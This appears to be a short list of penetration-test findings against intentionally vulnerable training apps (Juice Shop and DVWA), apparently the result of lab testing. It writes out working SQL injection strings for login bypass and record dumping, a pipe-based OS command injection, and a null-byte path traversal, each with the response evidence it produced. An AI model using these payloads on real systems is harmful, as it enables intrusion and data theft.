However, author emails appear only partially masked (e.g., '(***in@juice-sh.op)', '(***@juice-sh.op)'); full email addresses were not disclosed, so the PII criterion is not fully met. Anonymous entries have UserId null.

title: Juice Shop login authentication bypass via SQL injection in email
response_evidence: HTTP 200 with authentication token (JWT, redacted in capture) and bid=1, umail=admin@juice-sh.op — authenticated as the first user (admin).

title: DVWA SQL Injection (GET id) at security=low
response_evidence: [security=low] TRUE payload 1' OR '1'='1 returned 5 user records with surnames: admin, Brown, Me, Picasso, Smith (first names admin, Gordon, Hack, Pablo, Bob). FALSE payload 1' AND '1'='2 returned zero records (empty User ID result block).

title: OS Command Injection via pipe bypass in ping form [security=medium]
response_evidence: [security=medium] Response contains 'www-data' after ping output, using pipe payload '127.0.0.1| whoami' (semicolon blocked).

title: DVWA SQL Injection (medium) - numeric boolean in POST id parameter
response_evidence: [security=medium] TRUE payload 'id=1 OR 1=1' returned 5 user records (admin, Gordon Brown, Hack Me, Pablo Picasso, Bob Smith). FALSE payload 'id=1 AND 1=2' returned zero user records (only the dropdown option list 1-5 appears, no First name/Surname rows). Security Level: medium.

title: Juice Shop Poison Null-Byte Path Traversal bypass of /ftp/ .bak restriction
response_evidence: Raw path returned HTTP 403 'Error: Only .md and .pdf files are allowed!'. Null-byte path /ftp/package.json.bak%2500.md returned HTTP 200 with restricted backup content: {"name": "juice-shop", "version": "6.2.0-SNAPSHOT", "private": true, dependencies ...}.
